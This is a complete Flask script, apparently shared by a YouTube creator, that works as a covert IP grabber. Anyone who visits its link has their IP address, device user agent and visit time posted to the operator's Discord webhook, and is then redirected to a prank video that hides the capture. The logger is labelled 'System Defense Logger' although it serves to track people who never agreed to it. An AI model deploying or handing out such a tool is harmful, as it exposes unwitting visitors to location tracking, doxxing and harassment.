from flask import Flask, request, redirect
from datetime import datetime
import requests

app = Flask(__name__)

WEBHOOK_URL = "[YOUR WEBHOOK HERE]"

def send_to_discord(ip, user_agent, timestamp):
    payload = {
        "username": "System Defense Logger",
        "embeds": [
            {
                "title": "New Connection Detected",
                "color": 15158332, 
                "fields": [
                    {"name": "IP Address", "value": f"`{ip}`", "inline": True},
                    {"name": "Time (EEST)", "value": timestamp, "inline": True},
                    {"name": "Device Info", "value": user_agent, "inline": False}
                ],
                "footer": {"text": "IP LOGGER MADE BY V4MPRIBBN ON YT"}
            }
        ]
    }
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Error sending to Discord: {e}")

@app.route("/")
def index():
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr

    user_agent = request.headers.get('User-Agent', 'Unknown Device')
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    send_to_discord(ip, user_agent, timestamp)

    return redirect("https://youtu.be/dQw4w9WgXcQ?si=dvmgF95o-gCFX2ix")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80, threaded=True)
